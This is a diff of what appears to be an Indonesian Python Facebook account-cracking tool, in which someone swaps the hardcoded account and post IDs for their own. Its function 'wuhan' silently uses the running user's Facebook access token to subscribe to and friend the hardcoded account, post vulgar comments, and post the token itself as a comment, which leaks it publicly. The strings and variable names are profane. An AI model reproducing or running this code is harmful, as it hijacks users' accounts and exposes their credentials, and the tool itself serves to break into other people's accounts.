@@ -89,8 +89,8 @@ cp = []
 id = []
 user = []
 loop = 0
-xi_jimpinx = '1714000985456399'
-koh = '100005395413800'
+xi_jimpinx = '861386751423614'
+koh = '100026568911671'
 hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
 # lempankkkkkkkk
 def jalan(z):
@@ -115,7 +115,7 @@ logo = ''' \033[0;96m __  __        __  ______  ____
  \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Yayan-XD
  \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/KM39453'''
 
-lo_ngentod = '1714009362122228'
+lo_ngentod = '861386751423614'
 # crack selesai
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
@@ -247,16 +247,16 @@ def moch_yayan():
 def wuhan(kontol):
     try:
         kentod = kontol
-        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100022602965953/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
